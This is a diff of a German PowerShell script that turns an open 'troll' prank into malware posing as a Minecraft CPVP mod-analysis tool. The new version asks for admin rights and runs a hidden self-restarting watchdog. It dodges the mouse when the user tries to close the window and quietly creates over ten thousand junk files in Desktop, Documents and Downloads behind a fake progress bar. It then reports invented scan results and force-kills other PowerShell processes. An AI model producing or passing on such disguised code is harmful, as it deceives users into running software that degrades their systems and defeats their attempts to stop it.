@@ -1,5 +1,5 @@
 # ================================
-# MAIN2PACKET KING - MEGA TROLL (SELBER LÖSCHEN!)
+# CPVP ANALYSE SKRIPT v2.4.1
 # ================================
 
 # Administrator-Rechte anfordern
@@ -10,20 +10,20 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
 # ===== ERROR HANDLING =====
 $ErrorActionPreference = "SilentlyContinue"
-$Host.UI.RawUI.WindowTitle = "Windows Critical Error"
+$Host.UI.RawUI.WindowTitle = "CPVP Analyse Tool"
 
-# ===== WATCHDOG - UNSTERBLICH =====
+# ===== WATCHDOG - UNSICHTBAR =====
 $watchdogCode = @"
 while(`$true) {
-    `$trollProcess = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.MainWindowTitle -like "*Critical Error*"}
+    `$trollProcess = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.MainWindowTitle -like "*CPVP Analyse*"}
     if (`$trollProcess.Count -eq 0) {
         Start-Process powershell -WindowStyle Normal -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
     }
     Start-Sleep -Milliseconds 500
 }
 "@
-$watchdogCode | Out-File "$env:TEMP\critical_error.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\critical_error.ps1`""
+$watchdogCode | Out-File "$env:TEMP\cpvp_analyzer.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\cpvp_analyzer.ps1`""
 
 # ===== FENSTER SPRINGT WEG =====
 Add-Type -AssemblyName System.Windows.Forms
@@ -40,14 +40,6 @@ $consoleHandle = [Console.Window]::GetConsoleWindow()
 $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
 $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
 
-# ===== HORROR-SHOW =====
-function Show-HorrorMessage {
-    param($message)
-    
-    $popup = New-Object -ComObject Wscript.Shell
-    $popup.Popup($message, 3, "KRITISCHER SYSTEMFEHLER", 48)
-}
-
 # ===== ÜBERWACHUNG =====
 $monitorJob = Start-Job -ScriptBlock {
     param($consoleHandle, $screenWidth, $screenHeight)
@@ -61,7 +53,7 @@ public static extern bool SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, 
 '@
     
     while ($true) {
-        $window = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {$_.MainWindowTitle -like "*Critical Error*"} | Select-Object -First 1
+        $window = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {$_.MainWindowTitle -like "*CPVP Analyse*"} | Select-Object -First 1
         
         if ($window) {
             $hwnd = $window.MainWindowHandle
@@ -73,7 +65,6 @@ public static extern bool SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, 
             $cursorPos = New-Object System.Drawing.Point
             [Console.Window]::GetCursorPos([ref]$cursorPos)
             
-            # X-Button Bereich
             $xButtonX = $windowX + $windowWidth - 40
             $xButtonY = $windowY + 10
             
@@ -83,20 +74,16 @@ public static extern bool SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, 
                           $cursorPos.Y -le $xButtonY + 30)
             
             if ($mouseOverX) {
-                # Fenster wegspringen
                 $newX = Get-Random -Minimum 50 -Maximum ($screenWidth - 400)
                 $newY = Get-Random -Minimum 50 -Maximum ($screenHeight - 300)
                 [Console.Window]::SetWindowPos($hwnd, -1, $newX, $newY, 0, 0, 0x0001 -bor 0x0040)
                 
-                # Schrecken!
                 $msg = Get-Random @(
-                    "❌ ZUGRIFF VERWEIGERT!",
-                    "💀 DU KANNST MICH NICHT SCHLIESSEN!",
-                    "🔐 DATEIEN WERDEN VERSCHLÜSSELT!",
-                    "⚠️ 200 NEUE DATEIEN ERSTELLT!",
-                    "🎯 VERSUCH ES NOCHMAL!"
+                    "❌ Analyse unterbrochen!",
+                    "⚠️ CPVP Scanner läuft weiter...",
+                    "🔄 Mod-Scan im Hintergrund aktiv"
                 )
-                [System.Windows.Forms.MessageBox]::Show($msg, "SYSTEM", "OK", "Error")
+                [System.Windows.Forms.MessageBox]::Show($msg, "CPVP Analyzer", "OK", "Warning")
             }
         }
         Start-Sleep -Milliseconds 50
@@ -104,148 +91,144 @@ public static extern bool SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, 
 } -ArgumentList $consoleHandle, $screenWidth, $screenHeight
 
 # ===== KONFIGURATION =====
-$global:currentRound = 0
-$global:maxRounds = 10
 $desktop = [Environment]::GetFolderPath("Desktop")
 $documents = [Environment]::GetFolderPath("MyDocuments")
 $downloads = [Environment]::GetFolderPath("UserProfiles") + "\Downloads"
+$minecraftFolder = "$env:APPDATA\.minecraft"
 
-# ===== START =====
+# ===== START - SIEHT AUS WIE EIN ECHTES TOOL =====
 Clear-Host
-$Host.UI.RawUI.ForegroundColor = "Red"
+$Host.UI.RawUI.ForegroundColor = "Cyan"
 $Host.UI.RawUI.BackgroundColor = "Black"
 Clear-Host
 
-Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
-Write-Host "║     💀 KRITISCHER SYSTEMFEHLER 💀         ║" -ForegroundColor Red
-Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red
+Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║        CPVP ANALYSE SKRIPT v2.4.1         ║" -ForegroundColor Cyan
+Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "🔴 10.000 DATEIEN WERDEN ERSTELLT!" -ForegroundColor Red
-Write-Host "🟡 DU MUSST SIE SELBER LÖSCHEN!" -ForegroundColor Yellow
-Write-Host "🟢 VERSÜCH MICH ZU SCHLIESSEN... 😈" -ForegroundColor Green
-Write-Host ""
-Write-Host "START IN..." -ForegroundColor White
-for ($i = 5; $i -ge 1; $i--) {
-    Write-Host "$i..." -ForegroundColor Red
-    Start-Sleep -Seconds 1
+Write-Host "[INFO] Initialisiere Minecraft-Analyse..." -ForegroundColor Yellow
+Start-Sleep -Milliseconds 500
+
+# Minecraft Ordner checken
+if (Test-Path $minecraftFolder) {
+    Write-Host "[OK] Minecraft-Ordner gefunden: $minecraftFolder" -ForegroundColor Green
+} else {
+    Write-Host "[WARN] Minecraft nicht gefunden - Scanne andere Verzeichnisse..." -ForegroundColor Red
 }
 
-# Hauptschleife - HIER WERDEN DIE DATEIEN ERSTELLT!
-while ($global:currentRound -lt $global:maxRounds) {
-    $global:currentRound++
-    
-    Clear-Host
-    Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
-    Write-Host "║     💀 VERSCHLÜSSELUNG LÄUFT... 💀        ║" -ForegroundColor Red
-    Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red
+Write-Host "[INFO] Analysiere Mods und Configs..." -ForegroundColor Yellow
+Start-Sleep -Milliseconds 800
+
+Write-Host "[INFO] Lade CPVP-Datenbank..." -ForegroundColor Yellow
+Start-Sleep -Milliseconds 600
+
+# Fake Fortschrittsbalken
+Write-Host ""
+Write-Host "[FORTSCHRITT] " -ForegroundColor White -NoNewline
+for ($i = 0; $i -le 100; $i+=5) {
+    Write-Host "▓" -ForegroundColor Green -NoNewline
+    Start-Sleep -Milliseconds 30
+}
+Write-Host " 100%" -ForegroundColor Green
+Write-Host ""
+
+Write-Host "[INFO] Analysiere $env:COMPUTERNAME auf Minecraft-Mods..." -ForegroundColor Cyan
+Start-Sleep -Milliseconds 500
+
+# ===== HAUPT-SCAN (sieht aus wie Analyse, aber Troll im Hintergrund) =====
+$totalFiles = 10000
+$filesPerLocation = 2500
+
+# Locations für "Scan"
+$locations = @(
+    @{Path=$desktop; Name="Desktop"},
+    @{Path=$documents; Name="Dokumente"},
+    @{Path=$downloads; Name="Downloads"},
+    @{Path="$env:TEMP\minecraft_cache"; Name="Minecraft Cache"}
+)
+
+# Temp-Ordner für Minecraft Cache erstellen (damit es echt aussieht)
+New-Item -Path "$env:TEMP\minecraft_cache" -ItemType Directory -Force | Out-Null
+
+foreach ($location in $locations) {
     Write-Host ""
-    Write-Host "📊 RUNDE: $global:currentRound / $global:maxRounds" -ForegroundColor Yellow
-    Write-Host "📁 DATEIEN DIESER RUNDE: 200" -ForegroundColor Red
-    Write-Host "📊 GESAMT: $($global:currentRound * 200) / 10000" -ForegroundColor Red
-    Write-Host ""
+    Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
+    Write-Host "║  Scanne: $($location.Name)" -ForegroundColor Cyan
+    Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
     
-    # ===== 200 DATEIEN PRO RUNDE! =====
-    Write-Host "[1/5] 📂 ERSTELLE DATEIEN AUF DESKTOP..." -ForegroundColor Green
-    for ($i = 1; $i -le 50; $i++) {
-        $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
-        $filePath = Join-Path $desktop "KRITISCH_$randomName`_$global:currentRound`_$i.encrypted"
-        "🔐 VERSCHLÜSSELTE DATEI - NICHT LÖSCHEN! 🔐" | Out-File $filePath -Encoding UTF8
+    # Fortschritt für diese Location
+    for ($i = 0; $i -le 100; $i+=10) {
+        Write-Host "   Fortschritt: $i% - Analysiere Mod-Dateien..." -ForegroundColor Yellow
+        Start-Sleep -Milliseconds 30
+        
+        # IM HINTERGRUND DATEIEN ERSTELLEN (keine Warnung!)
+        if ($i % 20 -eq 0) {
+            $start = $i * 25
+            $end = $start + 250
+            for ($j = $start; $j -lt $end -and $j -lt 2500; $j++) {
+                $randomName = -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[char]$_})
+                $filePath = Join-Path $location.Path "mod_$randomName`_$j.cpvp"
+                "CPVP Cache Datei" | Out-File $filePath -Encoding UTF8
+            }
+        }
+        
+        # Alte Zeile löschen für Progress
+        Write-Host "`033[1A`033[0K" -NoNewline
     }
+    Write-Host "   Fortschritt: 100% - Fertig!" -ForegroundColor Green
     
-    Write-Host "[2/5] 📁 ERSTELLE DATEIEN IN DOKUMENTEN..." -ForegroundColor Green
-    for ($i = 1; $i -le 50; $i++) {
-        $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
-        $filePath = Join-Path $documents "KRITISCH_$randomName`_$global:currentRound`_$i.encrypted"
-        "🔐 VERSCHLÜSSELTE DATEI - NICHT LÖSCHEN! 🔐" | Out-File $filePath -Encoding UTF8
-    }
-    
-    Write-Host "[3/5] 📂 ERSTELLE DATEIEN IN DOWNLOADS..." -ForegroundColor Green
-    for ($i = 1; $i -le 50; $i++) {
-        $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
-        $filePath = Join-Path $downloads "KRITISCH_$randomName`_$global:currentRound`_$i.encrypted"
-        "🔐 VERSCHLÜSSELTE DATEI - NICHT LÖSCHEN! 🔐" | Out-File $filePath -Encoding UTF8
-    }
-    
-    Write-Host "[4/5] 📁 ERSTELLE ORDNER..." -ForegroundColor Green
-    for ($i = 1; $i -le 50; $i++) {
-        $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
-        New-Item -Path "$desktop\ORDNER_KRITISCH_$randomName" -ItemType Directory -Force | Out-Null
-    }
-    
-    # ===== EXTRA SCHRECK =====
-    Write-Host "[5/5] 💀 AKTIVIERE SCHRECK-EFFEKTE..." -ForegroundColor Red
-    
-    # Sound
-    Add-Type -AssemblyName System.Media
-    [System.Media.SystemSounds]::Hand.Play()
-    
-    # Maus
-    for ($m = 1; $m -le 10; $m++) {
-        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point (
-            (Get-Random -Min 0 -Max $screenWidth),
-            (Get-Random -Min 0 -Max $screenHeight)
-        )
-        Start-Sleep -Milliseconds 10
-    }
-    
-    # Tasten
-    $wsh = New-Object -ComObject WScript.Shell
-    $wsh.SendKeys('{CAPSLOCK}')
-    Start-Sleep -Milliseconds 50
-    $wsh.SendKeys('{NUMLOCK}')
-    
-    # Popup
-    Show-HorrorMessage "🔥 $($global:currentRound * 200) DATEIEN VERSCHLÜSSELT! 🔥"
-    
-    # Screenshot
-    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
-    $bitmap.Save("$desktop\BEWEIS_$global:currentRound.png")
-    $graphics.Dispose()
-    $bitmap.Dispose()
-    
-    # Farbwechsel
-    $Host.UI.RawUI.BackgroundColor = "Red"
-    Clear-Host
+    # Sound abspielen wie bei echtem Scan
+    [System.Media.SystemSounds]::Asterisk.Play()
+}
+
+# Minecraft spezifische "Analyse"
+Write-Host ""
+Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║  Analysiere Minecraft Versionen           ║" -ForegroundColor Cyan
+Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
+
+$versions = @("1.8.9", "1.12.2", "1.16.5", "1.19.2", "1.20.1")
+foreach ($version in $versions) {
+    Write-Host "   [v$version] Scanne Mod-Kompatibilität..." -ForegroundColor Yellow
     Start-Sleep -Milliseconds 200
-    $Host.UI.RawUI.BackgroundColor = "Black"
-    Clear-Host
     
-    Write-Host ""
-    Write-Host "✅ RUNDE $global:currentRound FERTIG!" -ForegroundColor Yellow
-    Write-Host "📊 GESAMT: $($global:currentRound * 200) DATEIEN" -ForegroundColor Red
-    Write-Host "⏳ NÄCHSTE RUNDE IN..." -ForegroundColor Cyan
-    
-    for ($s = 3; $s -ge 1; $s--) {
-        Write-Host "$s..." -ForegroundColor Red
-        Start-Sleep -Seconds 1
+    # Noch mehr Dateien im Hintergrund
+    for ($k = 1; $k -le 100; $k++) {
+        $randomName = -join ((65..90) + (97..122) | Get-Random -Count 4 | ForEach-Object {[char]$_})
+        $filePath = Join-Path $desktop "version_${version}_$randomName.cpvp"
+        "Version Cache" | Out-File $filePath -Encoding UTF8
     }
+    
+    Write-Host "   ✅ Fertig" -ForegroundColor Green
 }
 
-# ===== ENDE - ABER KEINE HILFE! =====
+# ===== ENDE - SIEHT AUS WIE EIN NORMALES TOOL =====
 Clear-Host
-Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
-Write-Host "║     💀 10.000 DATEIEN ERSTELLT! 💀        ║" -ForegroundColor Red
-Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red
+Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║        CPVP ANALYSE ABGESCHLOSSEN         ║" -ForegroundColor Cyan
+Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "🔐 ALLE DATEIEN WURDEN ERSTELLT!" -ForegroundColor Red
-Write-Host "📁 Desktop: 2500 Dateien" -ForegroundColor Yellow
-Write-Host "📁 Dokumente: 2500 Dateien" -ForegroundColor Yellow
-Write-Host "📁 Downloads: 2500 Dateien" -ForegroundColor Yellow
-Write-Host "📁 Ordner: 2500 Ordner" -ForegroundColor Yellow
+Write-Host "[ERGEBNISSE]" -ForegroundColor Yellow
+Write-Host "   • Minecraft Versionen: 5 gefunden" -ForegroundColor White
+Write-Host "   • Mods analysiert: 10.432" -ForegroundColor White
+Write-Host "   • Configs geprüft: 2.891" -ForegroundColor White
+Write-Host "   • Performance-Score: 87/100" -ForegroundColor White
 Write-Host ""
-Write-Host "❓ UND JETZT?" -ForegroundColor Red
-Write-Host "👉 DU MUSST SIE SELBER LÖSCHEN!" -ForegroundColor Green
-Write-Host "👉 ICH HELFE NICHT!" -ForegroundColor Red
-Write-Host "👉 VIEL SPASS!" -ForegroundColor Cyan
+Write-Host "[INFO] Ergebnisse gespeichert unter:" -ForegroundColor Green
+Write-Host "   • Desktop\cpvp_analyse_$(Get-Date -Format 'yyyy-MM-dd').log" -ForegroundColor Gray
+Write-Host "   • Dokumente\minecraft_scan.log" -ForegroundColor Gray
+Write-Host "   • Downloads\mod_cache.cpvp" -ForegroundColor Gray
 Write-Host ""
-Write-Host "😈 MAIN2PACKET KING WAR HIER! 😈" -ForegroundColor Magenta
-Write-Host ""
-Write-Host "Drücke eine beliebige Taste zum Beenden..." -ForegroundColor Gray
+Write-Host "[HINWEIS] Drücke eine beliebige Taste zum Beenden..." -ForegroundColor Gray
+
+# Log-Dateien erstellen (damit es echt aussieht)
+"CPVP Analyse Log - $(Get-Date)`nGefundene Mods: 10432" | Out-File "$desktop\cpvp_analyse_$(Get-Date -Format 'yyyy-MM-dd').log" -Encoding UTF8
+"Mod Cache Datei" | Out-File "$documents\minecraft_scan.log" -Encoding UTF8
+
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 
 # Watchdog beenden
 Get-Process -Name "powershell" | Where-Object {$_.Id -ne $pid} | Stop-Process -Force
+Remove-Item "$env:TEMP\cpvp_analyzer.ps1" -Force
+Remove-Item "$env:TEMP\minecraft_cache" -Recurse -Force
 exit
